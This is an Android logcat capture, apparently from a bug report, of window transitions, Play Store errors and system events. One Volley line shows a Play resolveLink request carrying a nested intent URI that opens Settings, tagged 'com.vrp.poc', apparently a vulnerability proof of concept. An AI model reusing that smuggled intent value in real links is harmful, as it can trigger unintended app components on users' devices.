+09-04 07:18:26.447  1431  1486 V WindowManager: Sent Transition (#209) createdAt=09-04 07:18:26.429 via request=TransitionRequestInfo { type = CLOSE, triggerTask = TaskInfo{userId=0 taskId=62 effectiveUid=10221 displayId=0 isRunning=false baseIntent=Intent { dat=https://client-side-encryption.google.com/... flg=0x34800000 cmp=com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity } baseActivity=null topActivity=null origActivity=null realActivity=ComponentInfo{com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseAuthorizationManagementActivity} realActivityIsAppLockEnabled=false numActivities=0 lastActiveTime=26601393 supportsMultiWindow=true supportsMultiWindowWithoutConstraints=true resizeMode=2 isResizeable=true minWidth=-1 minHeight=-1 defaultMinSize=220 token=WCT{RemoteToken{14cb530 Task{e08c7fc #62 type=standard A=10221:com.google.android.gm.appauth}}} topActivityType=1 pictureInPictureParams=null shouldDockBigOverlays=false launchIntoPipHostTaskId=-1 lastParentTaskIdBeforePip=-1 displayCutoutSafeInsets=Rect(0, 0 - 0, 0) topActivityInfo=null launchCookies=[] positionInParent=Point(0, 0) parentTaskId=-1 isFocused=true isInteractive=true isVisible=true isVisibleRequested=true isTopActivityNoDisplay=false isSleeping=false locusId=null displayAreaFeatureId=1 isTopActivityTransparent=false isActivityStackTransparent=true lastNonFullscreenBounds=Rect(276, 694 - 804, 1774) leafTaskBoundsFromOptions= false capturedLink=null capturedLinkTimestamp=0 requestedVisibleTypes=503 topActivityRequestOpenInBrowserEducationTimestamp=0 appCompatTaskInfo=AppCompatTaskInfo { topActivityInSizeCompat=false isLeafTask= true eligibleForLetterboxEducation= false isLetterboxEducationEnabled= false isLetterboxDoubleTapEnabled= false eligibleForUserAspectRatioButton= false topActivityBoundsLetterboxed= false isFromLetterboxDoubleTap= false topActivityLetterboxVerticalPosition= -1 topActivityLetterboxHorizontalPosition= -1 topActivityLetterboxWidth=-1 topActivityLetterboxHeight=-1 topActivityAppBounds=Rect(0, 0 - 0, 0) isUserFullscreenOverrideEnabled=false isSystemFullscreenOverrideEnabled=false hasMinAspectRatioOverride=false topActivityLetterboxBounds=null topNonResizableActivityAspectRatio=-1.0} topActivityMainWindowFrame=null isAppBubble=false}, pipChange = null, remoteTransitionInfo = null, displayChanges = null, requestedLocation = null, userChange = null, windowingLayerChange = null, fullscreenRequestChange = null, flags = 0, debugId = 209 }
+09-04 07:18:26.448  1431  1486 V WindowManager:     startWCT=WindowContainerTransaction { changes= {} hops= [] flags= 0 errorCallbackToken=null taskFragmentOrganizer=null }
+09-04 07:18:26.448  1431  1486 V WindowManager:     info={id=209 t=CLOSE f=0x0 trk=0 r=[0@Point(0, 0)] c=[
+09-04 07:18:26.448  1431  1486 V WindowManager:         {WCT{RemoteToken{14cb530 Task{e08c7fc #62 type=standard A=10221:com.google.android.gm.appauth}}} m=CLOSE f=FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=62#1617)/@0x60c6fd7 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0},
+09-04 07:18:26.448  1431  1486 V WindowManager:         {WCT{RemoteToken{88dee93 Task{f077b21 #61 type=standard A=10134:com.android.vending}}} m=TO_FRONT f=MOVE_TO_TOP|FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=61#1609)/@0x1ad79ff sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0}
+09-04 07:18:26.448  1431  1486 V WindowManager:     ]}
+09-04 07:18:26.448 15172 15172 I ContentCaptureHelper: Setting logging level to OFF
+09-04 07:18:26.448  1431  1486 V WindowManager: Finish Transition (#208): created at 09-04 07:18:26.374 collect-started=0.049ms request-sent=5.301ms started=7.063ms ready=34.759ms sent=38.575ms commit=22.077ms finished=73.877ms
+09-04 07:18:26.449  2052  2074 V WindowManagerShell: Playing animation for (#209) android.os.BinderProxy@da0034f@0
+09-04 07:18:26.449  2052  2074 D ShellSplitScreen: startAnimation: transition=209 isSplitActive=false
+09-04 07:18:26.449  2052  2074 V ShellRecents: RecentsTransitionHandler.startAnimation: no controller found
+09-04 07:18:26.449  2052  2074 V WindowManagerShell: Transition doesn't have explicit remote, search filters for match for {id=209 t=CLOSE f=0x0 trk=0 r=[0@Point(0, 0)] c=[{m=CLOSE f=FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=62#1617)/@0x583856b sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0},{m=TO_FRONT f=MOVE_TO_TOP|FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=61#1609)/@0x76898c8 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0}]}
+09-04 07:18:26.449  2052  2074 V WindowManagerShell:  Checking filter Pair{{types=[] flags=0x0 notFlags=0x0 checks=[{atype=undefined independent=true modes=[CLOSE,TO_BACK] flags=IN_TASK_WITH_EMBEDDED_ACTIVITY mustBeTask=false order=ANY topActivity=null launchCookie=null taskFragmentToken=android.os.BinderProxy@cb7dc2b windowingMode=undefined isCrossDisplayMove=false}]} RemoteTransition { remoteTransition = android.window.IRemoteTransition$Stub$Proxy@3a00888, appThread = android.app.IApplicationThread$Stub$Proxy@eed4221, debugName = overlayBackTransition, filter = {types=[] flags=0x0 notFlags=0x0 checks=[{atype=undefined independent=true modes=[CLOSE,TO_BACK] flags=IN_TASK_WITH_EMBEDDED_ACTIVITY mustBeTask=false order=ANY topActivity=null launchCookie=null taskFragmentToken=android.os.BinderProxy@cb7dc2b windowingMode=undefined isCrossDisplayMove=false}]} }}
+09-04 07:18:26.449  2052  2074 V WindowManagerShell:  Checking filter Pair{{types=[] flags=0x0 notFlags=0x0 checks=[{atype=dream independent=true modes=[OPEN,TO_FRONT] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{atype=home independent=true modes=[CLOSE,TO_BACK] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false}]} RemoteTransition { remoteTransition = android.window.IRemoteTransition$Stub$Proxy@bb16646, appThread = android.app.IApplicationThread$Stub$Proxy@7d61007, debugName = LauncherToDream, filter = {types=[] flags=0x0 notFlags=0x0 checks=[{atype=dream independent=true modes=[OPEN,TO_FRONT] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{atype=home independent=true modes=[CLOSE,TO_BACK] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false}]} }}
+09-04 07:18:26.449  2052  2074 V WindowManagerShell:  Checking filter Pair{{types=[] flags=0x0 notFlags=0x0 checks=[{atype=standard independent=false modes=[CHANGE] flags=NONE mustBeTask=true order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=true}]} RemoteTransition { remoteTransition = android.window.IRemoteTransition$Stub$Proxy@b712534, appThread = android.app.IApplicationThread$Stub$Proxy@2badf5d, debugName = QuickstepDisplayMove, filter = {types=[] flags=0x0 notFlags=0x0 checks=[{atype=standard independent=false modes=[CHANGE] flags=NONE mustBeTask=true order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=true}]} }}
+09-04 07:18:26.449  2052  2074 V WindowManagerShell:  Checking filter Pair{{types=[] flags=0x0 notFlags=0x100 checks=[{atype=home independent=true modes=[OPEN,TO_FRONT] flags=NONE mustBeTask=false order=ANY topActivity=ComponentInfo{com.google.android.apps.nexuslauncher/com.google.android.apps.nexuslauncher.NexusLauncherActivity} launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{atype=standard independent=true modes=[CLOSE,TO_BACK] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{NOT atype=undefined independent=true modes=[] flags=NONE mustBeTask=true order=ANY topActivity=null launchCookie=null customAnim=true windowingMode=undefined isCrossDisplayMove=false}]} RemoteTransition { remoteTransition = android.window.IRemoteTransition$Stub$Proxy@88da0d2, appThread = android.app.IApplicationThread$Stub$Proxy@fb9a5a3, debugName = QuickstepLaunchHome, filter = {types=[] flags=0x0 notFlags=0x100 checks=[{atype=home independent=true modes=[OPEN,TO_FRONT] flags=NONE mustBeTask=false order=ANY topActivity=ComponentInfo{com.google.android.apps.nexuslauncher/com.google.android.apps.nexuslauncher.NexusLauncherActivity} launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{atype=standard independent=true modes=[CLOSE,TO_BACK] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{NOT atype=undefined independent=true modes=[] flags=NONE mustBeTask=true order=ANY topActivity=null launchCookie=null customAnim=true windowingMode=undefined isCrossDisplayMove=false}]} }}
+09-04 07:18:26.449  2052  2074 V WindowManagerShell:  Delegate animation for (#209) to null
+09-04 07:18:26.449  2052  2074 V WindowManagerShell: start default transition animation, info = {id=209 t=CLOSE f=0x0 trk=0 r=[0@Point(0, 0)] c=[{m=CLOSE f=FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=62#1617)/@0x583856b sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0},{m=TO_FRONT f=MOVE_TO_TOP|FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=61#1609)/@0x76898c8 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0}]}
+09-04 07:18:26.449  2052  2074 V WindowManagerShell: loadAnimation: anim=android.view.animation.AnimationSet@dd30d47 animAttr=0xa type=CLOSE isEntrance=true
+09-04 07:18:26.449  2052  2074 V WindowManagerShell: loadAnimation: anim=android.view.animation.AnimationSet@a573e9d animAttr=0xb type=CLOSE isEntrance=false
+09-04 07:18:26.450  2052  2074 V WindowManagerShell:  animated by com.android.wm.shell.transition.DefaultTransitionHandler@f745678
+09-04 07:18:26.451 15172 15172 I ContentCaptureHelper: Setting logging level to OFF
+09-04 07:18:26.453 15172 15172 I ContentCaptureHelper: Setting logging level to OFF
+09-04 07:18:26.456 15172 15172 I ContentCaptureHelper: Setting logging level to OFF
+09-04 07:18:26.456  8828  8828 E Finsky  : [2] Error in resolveLink prewarming.
+09-04 07:18:26.456  8828  8828 E Finsky  : network time: 0, HTTP status code: na, exception DisplayErrorMessage[Item not found.]
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at bbjr.jv(PG:9)
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at owz.j(PG:9)
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at qgh.j(PG:22)
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at owt.run(PG:31)
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at android.os.Handler.handleCallback(Handler.java:1095)
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at android.os.Handler.dispatchMessageImpl(Handler.java:135)
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at android.os.Handler.dispatchMessage(Handler.java:125)
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at android.os.Looper.loopOnce(Looper.java:296)
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at android.os.Looper.loop(Looper.java:397)
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at android.app.ActivityThread.main(ActivityThread.java:9523)
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at java.lang.reflect.Method.invoke(Native Method)
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:575)
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:939)
+09-04 07:18:26.456  8828  8828 E Finsky  : Caused by: DisplayErrorMessage[Item not found.]
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at qgh.kR(PG:40)
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at owx.a(PG:204)
+09-04 07:18:26.456  8828  8828 E Finsky  : 	at owx.run(PG:6)
+09-04 07:18:26.460  1431  6903 D CorePackageUpdate: onRecentTaskRemoved Removing task: 59
+09-04 07:18:26.460  1431  6903 D CorePackageUpdate: Couldn't find a persistent state for task= 59
+09-04 07:18:26.462  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.462 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.462 14762 14762 D RecentsView: onTaskRemoved: 59, not handling task stack changes
+09-04 07:18:26.462 14762 14762 D RecentsView: onTaskRemoved: 59, not handling task stack changes
+09-04 07:18:26.463 11094 16594 D AdvertisingIdClient: AdvertisingIdClient already created.
+09-04 07:18:26.463 11094 16594 D AdvertisingIdClient: AdvertisingIdClient is not bounded. Starting to bind it...
+09-04 07:18:26.468   548   601 E hwc-display: [PrimaryDisplay] resetColorMappingInfoForClientComp:: resetColorMappingInfo() idx=1 error(-22)
+09-04 07:18:26.468   548   601 E hwc-display: Fail to open file /data/vendor/log/hwc/PrimaryDisplay_hwc_error_log0.txt, error: Permission denied
+09-04 07:18:26.468   548   601 E hwc-display: Fail to open file /data/log/PrimaryDisplay_hwc_error_log0.txt, error: No such file or directory
+09-04 07:18:26.468   548   601 E hwc-display: Unable to open log file for PrimaryDisplay_hwc_error_log0.txt
+09-04 07:18:26.464   548   548 W HwBinder:548_1: type=1400 audit(0.0:756): avc:  denied  { search } for  name="log" dev="dm-57" ino=709 scontext=u:r:hal_graphics_composer_default:s0 tcontext=u:object_r:vendor_log_file:s0 tclass=dir permissive=0
+09-04 07:18:26.464   548   548 W HwBinder:548_1: type=1400 audit(0.0:757): avc:  denied  { search } for  name="log" dev="dm-57" ino=709 scontext=u:r:hal_graphics_composer_default:s0 tcontext=u:object_r:vendor_log_file:s0 tclass=dir permissive=0
+09-04 07:18:26.471  1431  1898 I ImeTracker: com.android.vending:ad819a33: onRequestHide at ORIGIN_SERVER reason HIDE_UNSPECIFIED_WINDOW fromUser false userId 0 displayId 0
+09-04 07:18:26.472  8828  8828 D InsetsController: hide(ime())
+09-04 07:18:26.472  8828  8828 I ImeTracker: com.android.vending:ad819a33: onCancelled at PHASE_CLIENT_ALREADY_HIDDEN
+09-04 07:18:26.472 20490 20490 I SubtypeOperator: SubtypeOperator$1.onUnbindInput():43 
+09-04 07:18:26.472 20490 20490 I SubtypeOperator: SubtypeOperator$1.onBindInput():33 
+09-04 07:18:26.472 20490 20490 I GoogleInputMethodService: GoogleInputMethodService.onFinishInput():2361 
+09-04 07:18:26.473 20490 20490 I GoogleInputMethodService: GoogleInputMethodService.onStartInput():1532 onStartInput(EditorInfo{EditorInfo{packageName=com.android.vending, inputType=0, inputTypeString=NULL, enableLearning=false, autoCorrection=false, autoComplete=false, imeOptions=0, privateImeOptions=null, actionName=UNSPECIFIED, actionLabel=null, initialSelStart=-1, initialSelEnd=-1, initialCapsMode=0, label=null, fieldId=0, fieldName=null, extras=null, hintText=null, hintLocales=[]}}, false)
+09-04 07:18:26.473 20490 16597 I Module  : DeviceLockedStatusModuleProvider$Module.updateDeviceLockedStatusInternal():119 repeatCheckTimes = 0, locked = false
+09-04 07:18:26.473 20490 20490 I LatinIMEBase: LatinIMEBase.updateInputViewCoverNavigation():316 Update input view padding, isNavbarOverInputWindow=true, bottom inset=126
+09-04 07:18:26.473 20490 16402 I Module  : DeviceLockedStatusModuleProvider$Module.updateDeviceLockedStatusInternal():119 repeatCheckTimes = 1, locked = false
+09-04 07:18:26.473  1431  1898 W InputChannel-JNI: Channel already disposed.
+09-04 07:18:26.474  1431  8109 W PackageConfigPersister: App-specific configuration not found for packageName: com.android.vending and userId: 0
+09-04 07:18:26.474  1431  1464 I ImeTracker: system_server:537eb6f: onRequestHide at ORIGIN_SERVER reason IME_REQUESTED_CHANGED_LISTENER fromUser false displayId 0
+09-04 07:18:26.474  1431  1489 I ImeTracker: system_server:537eb6f: onCancelled at PHASE_SERVER_SHOULD_HIDE
+09-04 07:18:26.476  1431  6903 E TransitionChain: Can't collect into a chain with no transition
+09-04 07:18:26.476  1431  6903 E TransitionChain: Can't collect into a chain with no transition
+09-04 07:18:26.476  1431  1842 W UsageStatsService: Unexpected activity event reported! (com.google.android.googlequicksearchbox/com.google.android.apps.search.sceneviewer.ViewerActivity event : 23 instanceId : 216878918)
+09-04 07:18:26.476 11094 16594 D AdvertisingIdClient: AdvertisingIdClient is bounded
+09-04 07:18:26.477  1431  6903 D CorePackageUpdate: onRecentTaskRemoved Removing task: 43
+09-04 07:18:26.477  1431  6903 D CorePackageUpdate: Couldn't find a persistent state for task= 43
+09-04 07:18:26.478 14762 14762 D RecentsView: onTaskRemoved: 43, not handling task stack changes
+09-04 07:18:26.478  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.478 14762 14762 D RecentsView: onTaskRemoved: 43, not handling task stack changes
+09-04 07:18:26.479 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.479  1431  2277 D CorePackageUpdate: onRecentTaskRemoved Removing task: 60
+09-04 07:18:26.479  1431  2277 D CorePackageUpdate: Couldn't find a persistent state for task= 60
+09-04 07:18:26.479  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.480 14762 14762 D RecentsView: onTaskRemoved: 60, not handling task stack changes
+09-04 07:18:26.480 14762 14762 D RecentsView: onTaskRemoved: 60, not handling task stack changes
+09-04 07:18:26.480 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.485  2052  2074 V ShellTaskOrganizer: Task vanished taskId=43
+09-04 07:18:26.485  2052  2074 V ShellTaskOrganizer: Fullscreen Task Vanished: #43
+09-04 07:18:26.485  2052  2074 D ShellPackageUpdate: PackageUpdateController: Removing handlePackageUpdate for task: 43
+09-04 07:18:26.485  1431  6903 E WindowOrganizerController: Attempting to externally change a non-organized container: Task{b732f21 #43 type=standard I=com.google.android.googlequicksearchbox/.ViewerLauncher}={handlePackageUpdate:false,} playercount=2 taskorg=android.window.ITaskOrganizer$Stub$Proxy@180f111
+09-04 07:18:26.486  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.486  2052  2074 D ShellDesktopMode: AppToWebRepository: Task 43 is vanishing. Removing task data from repository
+09-04 07:18:26.486  2052  2074 V AppCompat: SingleSurfaceLetterboxController: []
+09-04 07:18:26.486  2052  2074 V AppCompat: MultiSurfaceLetterboxController: []
+09-04 07:18:26.486  2052  2074 V AppCompat: LetterboxInputController: []
+09-04 07:18:26.486  2052  2074 V AppCompat: RoundedCornersLetterboxController: {}
+09-04 07:18:26.486 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.489 11094 16594 I AdvertisingIdClient: shouldSendLog 25858970
+09-04 07:18:26.489 11094 16594 I AdvertisingIdClient: GetInfoInternal elapse 26ms
+09-04 07:18:26.518   548   601 E hwc-display: [PrimaryDisplay] resetColorMappingInfoForClientComp:: resetColorMappingInfo() idx=1 error(-22)
+09-04 07:18:26.518   548   601 E hwc-display: Fail to open file /data/vendor/log/hwc/PrimaryDisplay_hwc_error_log0.txt, error: Permission denied
+09-04 07:18:26.518   548   601 E hwc-display: Fail to open file /data/log/PrimaryDisplay_hwc_error_log0.txt, error: No such file or directory
+09-04 07:18:26.518   548   601 E hwc-display: Unable to open log file for PrimaryDisplay_hwc_error_log0.txt
+09-04 07:18:26.518   548   601 E hwc-display: [PrimaryDisplay] resetColorMappingInfoForClientComp:: resetColorMappingInfo() idx=2 error(-22)
+09-04 07:18:26.516   548   548 W HwBinder:548_1: type=1400 audit(0.0:758): avc:  denied  { search } for  name="log" dev="dm-57" ino=709 scontext=u:r:hal_graphics_composer_default:s0 tcontext=u:object_r:vendor_log_file:s0 tclass=dir permissive=0
+09-04 07:18:26.516   548   548 W HwBinder:548_1: type=1400 audit(0.0:759): avc:  denied  { search } for  name="log" dev="dm-57" ino=709 scontext=u:r:hal_graphics_composer_default:s0 tcontext=u:object_r:vendor_log_file:s0 tclass=dir permissive=0
+09-04 07:18:26.516   548   548 W HwBinder:548_1: type=1400 audit(0.0:760): avc:  denied  { search } for  name="log" dev="dm-57" ino=709 scontext=u:r:hal_graphics_composer_default:s0 tcontext=u:object_r:vendor_log_file:s0 tclass=dir permissive=0
+09-04 07:18:26.518   548   601 E hwc-display: Fail to open file /data/vendor/log/hwc/PrimaryDisplay_hwc_error_log0.txt, error: Permission denied
+09-04 07:18:26.519   548   601 E hwc-display: Fail to open file /data/log/PrimaryDisplay_hwc_error_log0.txt, error: No such file or directory
+09-04 07:18:26.519   548   601 E hwc-display: Unable to open log file for PrimaryDisplay_hwc_error_log0.txt
+09-04 07:18:26.539 12952 12962 W System  : A resource failed to call close. 
+09-04 07:18:26.577  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.578 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.579  2052  2074 V RecentTasksController: generateList(getRecentTasks)
+09-04 07:18:26.579  2052  2074 V RecentTasksController: initializeDesksMap - desktop windowing not available
+09-04 07:18:26.579  2052  2074 V RecentTasksController: Added fullscreen task: 61
+09-04 07:18:26.579  2052  2074 V RecentTasksController: Added fullscreen task: 58
+09-04 07:18:26.579  2052  2074 V RecentTasksController: Added fullscreen task: 51
+09-04 07:18:26.579  2052  2074 V RecentTasksController: generateList - complete
+09-04 07:18:26.580 14762 14782 D PreloadThumbnailUseCase: Preloading thumbnails for task ids: [[id=51 windowingMode=1 user=0 lastActiveTime=26100483] null, [id=58 windowingMode=1 user=0 lastActiveTime=26601316] null, [id=61 windowingMode=1 user=0 lastActiveTime=26601422] null]
+09-04 07:18:26.729  1431  1460 I system_server: NativeAlloc concurrent mark compact GC freed 11MB AllocSpace bytes, 4(80KB) LOS objects, 87% free, 62MB/512MB, paused 1.121ms,4.614ms total 307.762ms
+09-04 07:18:26.734  1431  1461 I libbinder.BpBinder: onLastStrongRef automatically unlinking death recipients for binder (0xb400007287979c50) with descriptor: '(not cached)'
+09-04 07:18:26.735  1431  1461 I libbinder.BpBinder: onLastStrongRef automatically unlinking death recipients for binder (0xb400007287986880) with descriptor: '(not cached)'
+09-04 07:18:26.737  1431  1462 W System  : A resource failed to call HardwareBuffer.close. 
+09-04 07:18:26.778  8828  9088 E Volley  : [85] oxm.a: Unexpected response code 404 for https://play-fe.googleapis.com/fdfe/resolveLink?url=http%3A%2F%2Fmarket.android.com%2Fdetails%3Fid%3Dcom.android.setting%26url%3Ds%253A%252F%252F%2523Intent%253Baction%253Dandroid.settings.SETTINGS%253Bend&ref=com.vrp.poc
+09-04 07:18:26.781  8828  9036 I cn_CronetUrlRequestContext: destroyNativeStreamLocked android.net.http.internal.org.chromium.net.impl.CronetBidirectionalStream@539ff90
+09-04 07:18:26.803  8828  8882 I PlayCommon: [55] Preparing logs for uploading
+09-04 07:18:26.804  8828  8882 I PlayCommon: [55] Connecting to server: https://play.googleapis.com/play/log?format=raw&proto_v2=true
+09-04 07:18:26.824  8828  8828 W Finsky  : [2] NestedChildRecyclerView used without an ancestor ParentRecyclerView in the view hierarchy.
+09-04 07:18:26.969  2052  2074 V WindowManagerShell: Transition animation finished (aborted=false), notifying core (#209) android.os.BinderProxy@da0034f@0
+09-04 07:18:26.976  1431  1486 V WindowManager: Finish Transition (#209): created at 09-04 07:18:26.429 collect-started=0.056ms request-sent=0.166ms started=3.443ms ready=10.759ms sent=13.166ms commit=9.045ms finished=546.72ms
+09-04 07:18:26.979  2052  2074 V WindowManagerShell: Track 0 became idle
+09-04 07:18:26.979  2052  2074 V WindowManagerShell: All active transition animations finished
+09-04 07:18:26.992 14762 14762 D RecentsView: onTaskRemoved: 62, not handling task stack changes
+09-04 07:18:26.993 14762 14762 D RecentsView: onTaskRemoved: 62, not handling task stack changes
+09-04 07:18:27.003  1431  6903 W WindowManager: Failed looking up window session=Session{a516d89 2052:u0a10250} callers=com.android.server.wm.WindowManagerService.windowForClient:6904 com.android.server.wm.WindowManagerService.relayoutWindow:2577 com.android.server.wm.Session.relayout:294 
+09-04 07:18:27.003  2052  2074 V ShellTaskOrganizer: Task vanished taskId=62
+09-04 07:18:27.003  2052  2074 V ShellTaskOrganizer: Fullscreen Task Vanished: #62
+09-04 07:18:27.003  2052  2074 D ShellPackageUpdate: PackageUpdateController: Removing handlePackageUpdate for task: 62
+09-04 07:18:27.004  1431  6903 E WindowOrganizerController: Attempting to externally change a non-organized container: Task{e08c7fc #62 type=standard A=10221:com.google.android.gm.appauth}={handlePackageUpdate:false,} playercount=2 taskorg=android.window.ITaskOrganizer$Stub$Proxy@180f111
+09-04 07:18:27.005  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:27.005  2052  2074 D ShellDesktopMode: AppToWebRepository: Task 62 is vanishing. Removing task data from repository
+09-04 07:18:27.005 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:27.006  2052  2074 V AppCompat: SingleSurfaceLetterboxController: []
+09-04 07:18:27.006  2052  2074 V AppCompat: MultiSurfaceLetterboxController: []
+09-04 07:18:27.006  2052  2074 V AppCompat: LetterboxInputController: []
+09-04 07:18:27.006  2052  2074 V AppCompat: RoundedCornersLetterboxController: {}
+09-04 07:18:27.006  1431  6903 W WindowManager: Failed looking up window session=Session{a516d89 2052:u0a10250} callers=com.android.server.wm.WindowManagerService.removeClientToken:2325 com.android.server.wm.Session.remove:281 android.view.IWindowSession$Stub.onTransact:637 
+09-04 07:18:27.086  1431  2029 I Surface : Creating surface for consumer unnamed-1431-60 with slotExpansion=1 for 64 slots
+09-04 07:18:27.087  1431  2029 I Surface : Creating surface for consumer ImageReader-864x1920f1m1-1431-48 with slotExpansion=1 for 64 slots
+09-04 07:18:27.087  1431  2029 W ImageReader_JNI: Unable to acquire a buffer item, very likely client tried to acquire more than maxImages buffers
+09-04 07:18:27.092  8828  8882 I PlayCommon: [55] Successfully uploaded logs.
+09-04 07:18:27.100  1431  2029 E ConsumerBase: [ImageReader-864x1920f1m1-1431-48] abandonLocked: ConsumerBase is abandoned!
+09-04 07:18:27.171  1729  1732 I pixel-thermal: cellular-emergency:33.5097 raw data: cellular-emergency:33509.6 
+09-04 07:18:27.171  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CPU:33.5097 raw data: VIRTUAL-SKIN:33509.6 VIRTUAL-SKIN-CPU:33509.6 
+09-04 07:18:27.172  1729  1732 I pixel-thermal: neutral_therm:32.863 raw data: neutral_therm:32863 
+09-04 07:18:27.172  1729  1732 I pixel-thermal: VIRTUAL-SKIN:33.5097 raw data: VIRTUAL-SKIN:33509.6 
+09-04 07:18:27.172  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CPU-GPU:33.5097 raw data: VIRTUAL-SKIN:33509.6 VIRTUAL-SKIN-CPU-GPU:33509.6 
+09-04 07:18:27.172  1729  1732 I pixel-thermal: VIRTUAL-SKIN-HINT:33.5097 raw data: VIRTUAL-SKIN:33509.6 VIRTUAL-SKIN-HINT:33509.6 
+09-04 07:18:27.172  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CHARGE:33.5097 raw data: VIRTUAL-SKIN:33509.6 VIRTUAL-SKIN-CHARGE:33509.6 
+09-04 07:18:27.196   926  1556 D audio_hw_35l41: cs35l41_rtlogger_data_analysis: Left/Top impedance: 100000
+09-04 07:18:27.197   926  1556 D audio_hw_35l41: cs35l41_rtlogger_data_analysis: Right/Bottom impedance: 100000
+09-04 07:18:27.199   926  1556 D audio_hw_35l41: cs35l41_bdlogger_data_analysis: Left/Top Max temp: 0x9319a ==> 36.775024 C
+09-04 07:18:27.200   926  1556 D audio_hw_35l41: cs35l41_bdlogger_data_analysis: Left/Top Max exc: 0x89e9 ==> 0.067339 mm
+09-04 07:18:27.200   926  1556 D audio_hw_35l41: cs35l41_bdlogger_data_analysis: Left/Top dsp heartbeat = 0x1200a
+09-04 07:18:27.200   926  1556 D audio_hw_35l41: cs35l41_bdlogger_data_analysis: Right/Bottom Max temp: 0x98b24 ==> 38.174072 C
+09-04 07:18:27.200   926  1556 D audio_hw_35l41: cs35l41_bdlogger_data_analysis: Right/Bottom Max exc: 0x321af ==> 0.391447 mm
+09-04 07:18:27.201   926  1556 D audio_hw_35l41: cs35l41_bdlogger_data_analysis: Right/Bottom dsp heartbeat = 0x1200b
+09-04 07:18:27.300  1431  2029 I Surface : Creating surface for consumer unnamed-1431-61 with slotExpansion=1 for 64 slots
+09-04 07:18:27.301  1431  2029 I Surface : Creating surface for consumer ImageReader-864x1920f1m1-1431-49 with slotExpansion=1 for 64 slots
+09-04 07:18:27.302  1431  2029 W ImageReader_JNI: Unable to acquire a buffer item, very likely client tried to acquire more than maxImages buffers
+09-04 07:18:27.319  1431  2029 E ConsumerBase: [ImageReader-864x1920f1m1-1431-49] abandonLocked: ConsumerBase is abandoned!
+09-04 07:18:27.443  1431  1857 D HintManagerService: Starts cleaning for 10355
+09-04 07:18:28.098 11073 16582 I NearbyMediums: Found Fast Ble Advertisements :
